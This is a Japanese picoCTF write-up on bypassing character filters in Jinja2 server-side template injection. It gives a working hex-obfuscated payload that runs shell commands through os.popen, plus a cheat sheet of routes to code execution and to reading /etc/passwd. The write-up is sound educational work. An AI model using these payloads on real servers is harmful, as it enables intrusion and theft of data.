---
title: "picoCTF SSTI2 writeup"
tag: ["Web", "SSTI", "jinja2"]
---

# SSTI2

## / Overview

フィルターをバイパスしたSSTI

## / Writeup

SSTIで`.`(ドット)が禁止されている場合、以下のような書き換えが使えます。

```python
# 属性
x.y
x|attr('y')

# item
x['y']
x|attr('__getitem__')('y')
x|attr('\x5f\x5fgetitem\x5f\x5f')('y')
```
(なんか属性なのにitemの書き方でもいける時がある)

最終的なペイロードはこちらです。
```python
{{lipsum|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(-1)|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(-140)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
```

改行すると次のようになります。

```python
{{
    lipsum
    |attr('\x5f\x5fclass\x5f\x5f')
    |attr('\x5f\x5fmro\x5f\x5f')
    |attr('\x5f\x5fgetitem\x5f\x5f')(-1)
    |attr('\x5f\x5fsubclasses\x5f\x5f')()
    |attr('\x5f\x5fgetitem\x5f\x5f')(-140)
    |attr('\x5f\x5finit\x5f\x5f')
    |attr('\x5f\x5fglobals\x5f\x5f')
    |attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')
    |attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')
    |attr('popen')('cat flag')
    |attr('read')()
}}
```


## / Other Technics

* `_`(アンダーバー)が禁止されている場合は16進で`\x5f`に置き換えると良いです。

* RCEの時、`ls`ではなく`ls 2>&1`とすることでエラーも出力される。

* `__dict__`をつなぐことで次に使える特殊属性とか見れるかも

```python
# 起点から__globals__まで
[起点となるオブジェクト]
│
├── クラス継承ルート ([].__class__ / "".__class__ / ().__class__)
│   └───→ __mro__[-1] (または __base__)
│       └───→ __subclasses__()
│           │
│           ├── [OS操作に関連するクラス]
│           │   └── subprocess.Popen, os._wrap_close, os._AddedDllDirectory 等
│           │       └───→ [index].__init__.__globals__
│           │
│           └── [警告・設定・橋渡し系クラス]
│               └── catch_warnings, codecs.IncrementalEncoder, linecache 等
│                   └───→ [index].__init__.__globals__
│
├── config (Configクラス)
│   └── .__class__
│         └── .from_envvar (Configのメソッド)
│               └── .__globals__
│
├── request (Requestクラス)
│   ├── .application
│   │     └── .__globals__
│   └── .__class__
│         └── ._load_form_data (メソッド)
│               └── .__globals__
│
├── url_for (Function)
│   └── .__globals__ 
│
├── self
|   └── .index (テンプレートのメソッドなど)
|         └── .__globals__ 
├── [Jinja2 Utilities] (lipsum / cycler / joiner / namespace)
|
│   └─── .__globals__ (または .__init__.__globals__)


# __globals__からRCEまで
__globals__
│
├── 【A】直球・標準ルート（組み込み関数を叩く）
│   ├── ["__builtins__"]["__import__"]("os").popen("ls").read()
│   ├── ["__builtins__"]["eval"]("__import__('os').popen('ls').read()")
│   └── ["__builtins__"]["exec"]("...") # Python評価
│
├── 【B】ショートカットルート（既にロード済みの変数を使う）
│   ├── ["os"].popen("ls").read()
│   └── ["sys"].modules["os"].popen("ls").read()
│
├── 【C】フレームワーク・ユーティリティルート
│   ├── ["import_string"]("os").popen("ls").read()  # Flask/Werkzeug等
│   └── ["services"]["process_manager"]...          # 独自実装のサービス
│
├── 【D】検知回避・難読化ルート（文字列制限がある場合）
|   ├── [request.args.param1]...                    # 外部から文字列を送り込む
|   ├── ["\x5f\x5fimport\x5f\x5f"]("os")            # 16進数エンコード
|   └── ["__built"+"ins__"]                         # 文字列結合
|
├── 【E】ファイル操作・情報漏洩ルート (RCE不可時の代替)
│   ├── ["__builtins__"]["open"]("/etc/passwd").read()
│   └── [任意の関数].__code__.co_consts  # ソースコード内の定数・秘密鍵抽出
```


